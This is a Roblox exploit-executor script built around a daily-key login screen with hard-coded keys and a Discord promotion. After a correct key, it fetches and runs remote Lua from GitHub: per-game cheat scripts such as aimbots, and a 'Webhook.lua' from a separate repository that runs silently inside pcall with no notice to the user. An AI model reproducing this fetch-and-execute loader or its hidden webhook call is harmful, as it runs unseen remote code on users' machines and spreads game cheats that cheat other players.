local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- ============================================================
-- DAILY KEYS
-- ============================================================
local dailyKeys = {
    ["20260401"] = "A9F3K2M8XQ", ["20260402"] = "P1L6Z8B0RC", ["20260403"] = "G4H7T9Y2VE",
    ["20260404"] = "M3X5C8W1QP", ["20260405"] = "D6R2F9L7SZ", ["20260406"] = "V0N3K5A8TJ",
    ["20260407"] = "B9C1M4X6PG", ["20260408"] = "H2Q7Z5R0LW", ["20260409"] = "J8V3T6S1EN",
    ["20260410"] = "K5F1D9B7QA", ["20260411"] = "L6M2C3X8RT", ["20260412"] = "N1P4V9G5SZ",
    ["20260413"] = "R2J8F3L6WB", ["20260414"] = "S7H0C1T5QP", ["20260415"] = "T4K9M6X2RE",
    ["20260416"] = "U3B5V8L0QN", ["20260417"] = "W6D1P7F4ZA", ["20260418"] = "X9R2H5T8YC",
    ["20260419"] = "Y0M3K6C1PL", ["20260420"] = "Z7J8F2L5QR", ["20260421"] = "A2T9V4G7XS",
    ["20260422"] = "B5C1K8M3QP", ["20260423"] = "C6H4R0F9LW", ["20260424"] = "D3M7T2S6EN",
    ["20260425"] = "E8P5K1X4RA", ["20260426"] = "F0J3C9V6QZ", ["20260427"] = "G7L2M5T8YS",
    ["20260428"] = "H1K9B4F3QP", ["20260429"] = "I5D2V7L0RE", ["20260430"] = "J6M3X1C8ZN",
    ["20260501"] = "K9F0R6T5WP", ["20260502"] = "L4H2M3X7QA", ["20260503"] = "M1P8V9G2SZ",
    ["20260504"] = "N7J0F4L6WB", ["20260505"] = "O3C5T1Q8RP", ["20260506"] = "P8K2M7X4RE",
    ["20260507"] = "Q0B6V1L9QN", ["20260508"] = "R5D3P8F2ZA", ["20260509"] = "S9R1H6T5YC",
    ["20260510"] = "T4M7K0C3PL", ["20260511"] = "U8J2F9L1QR", ["20260512"] = "V3T5V4G8XS",
    ["20260513"] = "W6C1K7M2QP", ["20260514"] = "X2H4R8F0LW", ["20260515"] = "Y9M1T5S3EN",
    ["20260516"] = "Z5P3K6X7RA", ["20260517"] = "A0J8C2V4QZ", ["20260518"] = "B7L5M1T9YS",
    ["20260519"] = "C3K9B6F0QP", ["20260520"] = "D6D1V7L2RE", ["20260521"] = "E9M4X3C8ZN",
    ["20260522"] = "F2F5R1T6WP", ["20260523"] = "G8H3M2X9QA", ["20260524"] = "H1P7V0G5SZ",
    ["20260525"] = "I6J4F8L3WB", ["20260526"] = "J0C2T5Q7RP", ["20260527"] = "K5K8M1X6RE",
    ["20260528"] = "L3B9V4L0QN", ["20260529"] = "M7D1P3F8ZA", ["20260530"] = "N2R6H9T5YC",
    ["20260531"] = "O8M0K7C2PL"
}

local dateTable = os.date("*t")
local today = string.format("%04d%02d%02d", dateTable.year, dateTable.month, dateTable.day)
local key = dailyKeys[today]

if not key then
    warn("[KeySystem] No key found for today: " .. today)
    return
end

-- ============================================================
-- LOADER SCRIPT FUNCTION (will be called after successful auth)
-- ============================================================
local function executeLoaderScript()
    setfpscap(10000)

    local _game = game
    local Players = _game:GetService("Players")
    local HttpService = _game:GetService("HttpService")
    local CoreGui = _game:GetService("CoreGui")

    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/Webhook.lua"))()
        end)
    end)

    local gameLinks = {
        [1962086868] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/toh.lua",
        [12355337193] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
        [3214114884] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/flagwars.lua",
        [6722284015] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/pistol1v1.lua",
        [4410049285] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/drivingsimulator.lua",
        [13771457545] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
        [13775113583] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
        [13772394625] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/bladeball.lua",
        [15264892126] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/bladeball.lua",
        [13864661000] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/breakin2.lua",
        [13864667823] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/breakin2.lua",
        [301549746] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/counterblox.lua",
        [17625359962] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
        [117398147513099] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
        [286090429] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
        [109397169461300] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
        [134784668468620] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
        [14518422161] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
        [15514727567] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
        [122291041295001] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
        [8735521924] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/aimbot.lua",
    }

    local scriptUrl = gameLinks[_game.PlaceId]

    if scriptUrl then
        pcall(function()
            loadstring(_game:HttpGet(scriptUrl))()
        end)
    else
        warn("Not Supported")
    end
end

-- ============================================================
-- HELPERS
-- ============================================================
local function tw(obj, info, props)
    TweenService:Create(obj, info, props):Play()
end
local function makeCorner(parent, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 8)
    c.Parent = parent
end
local function makePad(parent, t, b, l, r)
    local p = Instance.new("UIPadding")
    p.PaddingTop    = UDim.new(0, t or 0)
    p.PaddingBottom = UDim.new(0, b or 0)
    p.PaddingLeft   = UDim.new(0, l or 0)
    p.PaddingRight  = UDim.new(0, r or 0)
    p.Parent = parent
end

-- ============================================================
-- SCREEN GUI
-- ============================================================
local screenGui = Instance.new("ScreenGui")
screenGui.Name           = "KeySystemGui"
screenGui.ResetOnSpawn   = false
-- IgnoreGuiInset = true makes the GUI cover the FULL screen (including top inset bar)
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent         = player:WaitForChild("PlayerGui")

-- ── Fullscreen backdrop ───────────────────────────────────────
-- Size + Position use offset 0 so it truly fills every pixel
local backdrop = Instance.new("Frame")
backdrop.Name                   = "Backdrop"
backdrop.Size                   = UDim2.new(1, 0, 1, 0)
backdrop.Position               = UDim2.new(0, 0, 0, 0)
backdrop.AnchorPoint            = Vector2.new(0, 0)
backdrop.BackgroundColor3       = Color3.fromRGB(4, 4, 10)
backdrop.BackgroundTransparency = 1
backdrop.BorderSizePixel        = 0
backdrop.ZIndex                 = 1
backdrop.Parent                 = screenGui

-- ── Glow shell ────────────────────────────────────────────────
local glowShell = Instance.new("Frame")
glowShell.Name                   = "GlowShell"
glowShell.AnchorPoint            = Vector2.new(0.5, 0.5)
glowShell.Size                   = UDim2.new(0, 440, 0, 440)
glowShell.Position               = UDim2.new(0.5, 0, 0.5, 0)
glowShell.BackgroundColor3       = Color3.fromRGB(99, 102, 241)
glowShell.BackgroundTransparency = 1
glowShell.BorderSizePixel        = 0
glowShell.ZIndex                 = 2
glowShell.Parent                 = screenGui
makeCorner(glowShell, 22)

-- ── Main card ─────────────────────────────────────────────────
local card = Instance.new("Frame")
card.Name                   = "Card"
card.Size                   = UDim2.new(1, -6, 1, -6)
card.Position               = UDim2.new(0, 3, 0, 3)
card.BackgroundColor3       = Color3.fromRGB(10, 10, 16)
card.BackgroundTransparency = 1
card.BorderSizePixel        = 0
card.ZIndex                 = 3
card.Parent                 = glowShell
makeCorner(card, 20)

local cardLayout = Instance.new("UIListLayout")
cardLayout.FillDirection       = Enum.FillDirection.Vertical
cardLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
cardLayout.SortOrder           = Enum.SortOrder.LayoutOrder
cardLayout.Padding             = UDim.new(0, 13)
cardLayout.Parent              = card
makePad(card, 24, 20, 26, 26)

-- ── Badge ─────────────────────────────────────────────────────
local badgeWrap = Instance.new("Frame")
badgeWrap.Name                   = "BadgeWrap"
badgeWrap.Size                   = UDim2.new(1, 0, 0, 26)
badgeWrap.BackgroundTransparency = 1
badgeWrap.LayoutOrder            = 1
badgeWrap.ZIndex                 = 4
badgeWrap.Parent                 = card

local badge = Instance.new("TextLabel")
badge.Name                   = "Badge"
badge.AnchorPoint            = Vector2.new(0.5, 0)
badge.Size                   = UDim2.new(0, 140, 1, 0)
badge.Position               = UDim2.new(0.5, 0, 0, 0)
badge.Text                   = "🔐  SECURE ACCESS"
badge.Font                   = Enum.Font.GothamBold
badge.TextSize               = 10
badge.TextColor3             = Color3.fromRGB(165, 180, 252)
badge.BackgroundColor3       = Color3.fromRGB(28, 26, 70)
badge.BackgroundTransparency = 1
badge.BorderSizePixel        = 0
badge.ZIndex                 = 4
badge.Parent                 = badgeWrap
makeCorner(badge, 100)

-- ── Title ─────────────────────────────────────────────────────
local title = Instance.new("TextLabel")
title.Name                   = "Title"
title.Size                   = UDim2.new(1, 0, 0, 34)
title.Text                   = "Authentication Required"
title.Font                   = Enum.Font.GothamBold
title.TextSize               = 23
title.TextColor3             = Color3.fromRGB(240, 244, 255)
title.BackgroundTransparency = 1
title.TextXAlignment         = Enum.TextXAlignment.Center
title.LayoutOrder            = 2
title.ZIndex                 = 4
title.Parent                 = card

-- ── Subtitle ──────────────────────────────────────────────────
local subtitle = Instance.new("TextLabel")
subtitle.Name                   = "Subtitle"
subtitle.Size                   = UDim2.new(1, 0, 0, 16)
subtitle.Text                   = "Enter your daily key to unlock access"
subtitle.Font                   = Enum.Font.Gotham
subtitle.TextSize               = 12
subtitle.TextColor3             = Color3.fromRGB(70, 85, 115)
subtitle.BackgroundTransparency = 1
subtitle.TextXAlignment         = Enum.TextXAlignment.Center
subtitle.LayoutOrder            = 3
subtitle.ZIndex                 = 4
subtitle.Parent                 = card

-- ── Divider ───────────────────────────────────────────────────
local divider = Instance.new("Frame")
divider.Name              = "Divider"
divider.Size              = UDim2.new(1, 0, 0, 1)
divider.BackgroundColor3  = Color3.fromRGB(22, 26, 46)
divider.BorderSizePixel   = 0
divider.LayoutOrder       = 4
divider.ZIndex            = 4
divider.Parent            = card

-- ── Input wrapper ─────────────────────────────────────────────
local inputWrap = Instance.new("Frame")
inputWrap.Name              = "InputWrap"
inputWrap.Size              = UDim2.new(1, 0, 0, 50)
inputWrap.BackgroundColor3  = Color3.fromRGB(15, 15, 24)
inputWrap.BorderSizePixel   = 0
inputWrap.LayoutOrder       = 5
inputWrap.ZIndex            = 4
inputWrap.Parent            = card
makeCorner(inputWrap, 12)

local stroke = Instance.new("UIStroke")
stroke.Color     = Color3.fromRGB(40, 44, 72)
stroke.Thickness = 1
stroke.Parent    = inputWrap

local textBox = Instance.new("TextBox")
textBox.Name                   = "KeyInput"
textBox.Size                   = UDim2.new(1, 0, 1, 0)
textBox.BackgroundTransparency = 1
textBox.PlaceholderText        = "Enter key  ·  e.g.  A9F3K2M8XQ"
textBox.PlaceholderColor3      = Color3.fromRGB(48, 56, 86)
textBox.Text                   = ""
textBox.Font                   = Enum.Font.Code
textBox.TextSize               = 18
textBox.TextColor3             = Color3.fromRGB(210, 222, 255)
textBox.TextXAlignment         = Enum.TextXAlignment.Center
textBox.ClearTextOnFocus       = false
textBox.ZIndex                 = 5
textBox.Parent                 = inputWrap
makePad(textBox, 0, 0, 12, 12)

textBox.Focused:Connect(function()
    tw(stroke, TweenInfo.new(0.2), { Color = Color3.fromRGB(99, 102, 241), Thickness = 1.5 })
    tw(inputWrap, TweenInfo.new(0.2), { BackgroundColor3 = Color3.fromRGB(18, 18, 30) })
end)
textBox.FocusLost:Connect(function()
    tw(stroke, TweenInfo.new(0.2), { Color = Color3.fromRGB(40, 44, 72), Thickness = 1 })
    tw(inputWrap, TweenInfo.new(0.2), { BackgroundColor3 = Color3.fromRGB(15, 15, 24) })
end)

-- ── Status label ──────────────────────────────────────────────
local status = Instance.new("TextLabel")
status.Name                   = "Status"
status.Size                   = UDim2.new(1, 0, 0, 14)
status.Text                   = ""
status.Font                   = Enum.Font.Gotham
status.TextSize               = 11
status.TextColor3             = Color3.fromRGB(248, 113, 113)
status.BackgroundTransparency = 1
status.TextXAlignment         = Enum.TextXAlignment.Center
status.LayoutOrder            = 6
status.ZIndex                 = 4
status.Parent                 = card

-- ── Unlock button (constrained inside card width) ─────────────
local button = Instance.new("TextButton")
button.Name             = "UnlockBtn"
-- Use full card width so it respects the card's own padding (set via makePad on card)
button.Size             = UDim2.new(1, 0, 0, 46)
button.Text             = "Unlock Access"
button.Font             = Enum.Font.GothamBold
button.TextSize         = 15
button.TextColor3       = Color3.fromRGB(255, 255, 255)
button.BackgroundColor3 = Color3.fromRGB(79, 70, 229)
button.BorderSizePixel  = 0
button.AutoButtonColor  = false
button.LayoutOrder      = 7
button.ZIndex           = 4
button.Parent           = card
makeCorner(button, 12)

local btnGrad = Instance.new("UIGradient")
btnGrad.Color    = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(105, 108, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(67, 56, 202))
})
btnGrad.Rotation = 90
btnGrad.Parent   = button

button.MouseEnter:Connect(function()
    tw(button, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(110, 115, 255) })
end)
button.MouseLeave:Connect(function()
    tw(button, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(79, 70, 229) })
end)
button.MouseButton1Down:Connect(function()
    tw(button, TweenInfo.new(0.08), { BackgroundColor3 = Color3.fromRGB(50, 44, 160) })
end)
button.MouseButton1Up:Connect(function()
    tw(button, TweenInfo.new(0.08), { BackgroundColor3 = Color3.fromRGB(99, 102, 241) })
end)

-- ── Second divider ────────────────────────────────────────────
local divider2 = Instance.new("Frame")
divider2.Name             = "Divider2"
divider2.Size             = UDim2.new(1, 0, 0, 1)
divider2.BackgroundColor3 = Color3.fromRGB(22, 26, 46)
divider2.BorderSizePixel  = 0
divider2.LayoutOrder      = 8
divider2.ZIndex           = 4
divider2.Parent           = card

-- ── Discord copy row ──────────────────────────────────────────
local discordRow = Instance.new("Frame")
discordRow.Name             = "DiscordRow"
discordRow.Size             = UDim2.new(1, 0, 0, 42)
discordRow.BackgroundColor3 = Color3.fromRGB(13, 13, 21)
discordRow.BorderSizePixel  = 0
discordRow.LayoutOrder      = 9
discordRow.ZIndex           = 4
discordRow.Parent           = card
makeCorner(discordRow, 12)

local discordStroke = Instance.new("UIStroke")
discordStroke.Color     = Color3.fromRGB(35, 38, 65)
discordStroke.Thickness = 1
discordStroke.Parent    = discordRow

-- Row layout: icon | link text | copy button
local rowLayout = Instance.new("UIListLayout")
rowLayout.FillDirection       = Enum.FillDirection.Horizontal
rowLayout.VerticalAlignment   = Enum.VerticalAlignment.Center
rowLayout.SortOrder           = Enum.SortOrder.LayoutOrder
rowLayout.Padding             = UDim.new(0, 0)
rowLayout.Parent              = discordRow
makePad(discordRow, 0, 0, 12, 8)

local discordIcon = Instance.new("TextLabel")
discordIcon.Name                   = "Icon"
discordIcon.Size                   = UDim2.new(0, 24, 1, 0)
discordIcon.Text                   = "🔗"
discordIcon.Font                   = Enum.Font.Gotham
discordIcon.TextSize               = 14
discordIcon.TextColor3             = Color3.fromRGB(130, 148, 210)
discordIcon.BackgroundTransparency = 1
discordIcon.LayoutOrder            = 1
discordIcon.ZIndex                 = 5
discordIcon.Parent                 = discordRow

local discordLink = Instance.new("TextLabel")
discordLink.Name                   = "Link"
discordLink.Size                   = UDim2.new(1, -100, 1, 0)
discordLink.Text                   = "discord.gg/ARVgx494Wk"
discordLink.Font                   = Enum.Font.Code
discordLink.TextSize               = 11
discordLink.TextColor3             = Color3.fromRGB(100, 120, 190)
discordLink.BackgroundTransparency = 1
discordLink.TextXAlignment         = Enum.TextXAlignment.Left
discordLink.TextTruncate           = Enum.TextTruncate.AtEnd
discordLink.LayoutOrder            = 2
discordLink.ZIndex                 = 5
discordLink.Parent                 = discordRow

local copyBtn = Instance.new("TextButton")
copyBtn.Name             = "CopyBtn"
copyBtn.Size             = UDim2.new(0, 66, 0, 28)
copyBtn.Text             = "Copy"
copyBtn.Font             = Enum.Font.GothamBold
copyBtn.TextSize         = 12
copyBtn.TextColor3       = Color3.fromRGB(165, 180, 252)
copyBtn.BackgroundColor3 = Color3.fromRGB(28, 26, 70)
copyBtn.BorderSizePixel  = 0
copyBtn.AutoButtonColor  = false
copyBtn.LayoutOrder      = 3
copyBtn.ZIndex           = 5
copyBtn.Parent           = discordRow
makeCorner(copyBtn, 8)

copyBtn.MouseEnter:Connect(function()
    tw(copyBtn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(44, 40, 110) })
end)
copyBtn.MouseLeave:Connect(function()
    tw(copyBtn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(28, 26, 70) })
end)

copyBtn.MouseButton1Click:Connect(function()
    -- setclipboard is available in most Roblox executors
    local ok = pcall(setclipboard, "https://discord.gg/ARVgx494Wk")
    if ok then
        copyBtn.Text = "✓ Copied!"
        tw(copyBtn, TweenInfo.new(0.15), { BackgroundColor3 = Color3.fromRGB(18, 60, 35) })
        tw(copyBtn, TweenInfo.new(0.15), { TextColor3 = Color3.fromRGB(90, 210, 130) })
        task.delay(2.5, function()
            if copyBtn and copyBtn.Parent then
                copyBtn.Text = "Copy"
                tw(copyBtn, TweenInfo.new(0.3), { BackgroundColor3 = Color3.fromRGB(28, 26, 70) })
                tw(copyBtn, TweenInfo.new(0.3), { TextColor3 = Color3.fromRGB(165, 180, 252) })
            end
        end)
    else
        -- Executor doesn't support setclipboard; show the link for manual copy
        copyBtn.Text = "See chat"
        print("[KeySystem] Discord: https://discord.gg/ARVgx494Wk")
    end
end)

-- ── Footer ────────────────────────────────────────────────────
local hint = Instance.new("TextLabel")
hint.Name                   = "Hint"
hint.Size                   = UDim2.new(1, 0, 0, 13)
hint.Text                   = "Keys rotate daily at midnight  ·  Join Discord for today's key"
hint.Font                   = Enum.Font.Gotham
hint.TextSize               = 10
hint.TextColor3             = Color3.fromRGB(36, 44, 64)
hint.BackgroundTransparency = 1
hint.TextXAlignment         = Enum.TextXAlignment.Center
hint.LayoutOrder            = 10
hint.ZIndex                 = 4
hint.Parent                 = card

-- ============================================================
-- ENTRY ANIMATION
-- ============================================================
glowShell.Position               = UDim2.new(0.5, 0, 0.58, 0)
glowShell.BackgroundTransparency = 1
card.BackgroundTransparency      = 1

local allText = {}
local function gatherText(root)
    for _, d in ipairs(root:GetDescendants()) do
        if d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox") then
            table.insert(allText, d)
            d.TextTransparency = 1
        end
    end
end
gatherText(card)

badge.BackgroundTransparency    = 1
inputWrap.BackgroundTransparency = 1
discordRow.BackgroundTransparency = 1
copyBtn.BackgroundTransparency  = 1
divider.BackgroundTransparency  = 1
divider2.BackgroundTransparency = 1

tw(backdrop, TweenInfo.new(0.45), { BackgroundTransparency = 0.5 })
tw(glowShell, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
    Position             = UDim2.new(0.5, 0, 0.5, 0),
    BackgroundTransparency = 0.62
})
tw(card, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
    BackgroundTransparency = 0
})
task.delay(0.22, function()
    badge.BackgroundTransparency    = 0
    inputWrap.BackgroundTransparency = 0
    discordRow.BackgroundTransparency = 0
    copyBtn.BackgroundTransparency  = 0
    divider.BackgroundTransparency  = 0
    divider2.BackgroundTransparency = 0
    for _, t in ipairs(allText) do
        tw(t, TweenInfo.new(0.3), { TextTransparency = 0 })
    end
end)

-- ============================================================
-- ATTEMPT LOGIC
-- ============================================================
local attempts    = 0
local MAX_ATTEMPTS = 5
local locked      = false
local loaderExecuted = false

local function shakeCard()
    for _, ox in ipairs({-14, 14, -9, 9, -5, 5, -2, 2, 0}) do
        tw(glowShell, TweenInfo.new(0.04, Enum.EasingStyle.Linear), {
            Position = UDim2.new(0.5, ox, 0.5, 0)
        })
        task.wait(0.045)
    end
    glowShell.Position = UDim2.new(0.5, 0, 0.5, 0)
end

local function flashStroke(color)
    tw(stroke, TweenInfo.new(0.1), { Color = color, Thickness = 2 })
    task.delay(0.7, function()
        tw(stroke, TweenInfo.new(0.35), { Color = Color3.fromRGB(40, 44, 72), Thickness = 1 })
    end)
end

local function kickPlayer()
    -- Flash screen red, show message, then kick
    tw(backdrop, TweenInfo.new(0.3), { BackgroundColor3 = Color3.fromRGB(80, 10, 10), BackgroundTransparency = 0.3 })
    tw(glowShell, TweenInfo.new(0.3), { BackgroundColor3 = Color3.fromRGB(220, 40, 40) })
    status.Text       = "Removing you from the server..."
    status.TextColor3 = Color3.fromRGB(255, 80, 80)
    task.wait(1.8)
    player:Kick("You have been removed: Too many failed key attempts.\nRejoin and use the correct daily key.\nGet the daily key in our Discord: https://discord.gg/ARVgx494Wk")
end

local function unlockSuccess()
    -- Execute the loader script only once and only after successful authentication
    if not loaderExecuted then
        loaderExecuted = true
        task.spawn(executeLoaderScript)
    end
    
    button.Text     = "✓  Access Granted"
    btnGrad.Enabled = false
    tw(button, TweenInfo.new(0.3), { BackgroundColor3 = Color3.fromRGB(34, 197, 94) })
    flashStroke(Color3.fromRGB(34, 197, 94))
    task.wait(0.9)

    tw(backdrop, TweenInfo.new(0.55), { BackgroundTransparency = 1 })
    tw(glowShell, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {
        Position             = UDim2.new(0.5, 0, 0.42, 0),
        BackgroundTransparency = 1
    })
    tw(card, TweenInfo.new(0.45), { BackgroundTransparency = 1 })
    for _, t in ipairs(allText) do
        tw(t, TweenInfo.new(0.35), { TextTransparency = 1 })
    end
    task.wait(0.6)
    screenGui:Destroy()
end

local function onUnlock()
    if locked then return end
    local input = textBox.Text:gsub("%s+", ""):upper()

    if input == key then
        locked = true
        unlockSuccess()
    else
        attempts += 1
        task.spawn(shakeCard)
        flashStroke(Color3.fromRGB(248, 113, 113))
        textBox.Text = ""

        if attempts >= MAX_ATTEMPTS then
            locked = true
            textBox.TextEditable = false
            button.Text          = "Kicking..."
            btnGrad.Enabled      = false
            tw(button, TweenInfo.new(0.3), { BackgroundColor3 = Color3.fromRGB(160, 25, 25) })
            task.spawn(kickPlayer)
        else
            local rem = MAX_ATTEMPTS - attempts
            status.Text = string.format(
                "Wrong key  ·  %d attempt%s left before kick",
                rem, rem == 1 and "" or "s"
            )
            status.TextColor3 = Color3.fromRGB(248, 113, 113)
        end
    end
end

button.MouseButton1Click:Connect(onUnlock)
textBox.FocusLost:Connect(function(enter)
    if enter then onUnlock() end
end)
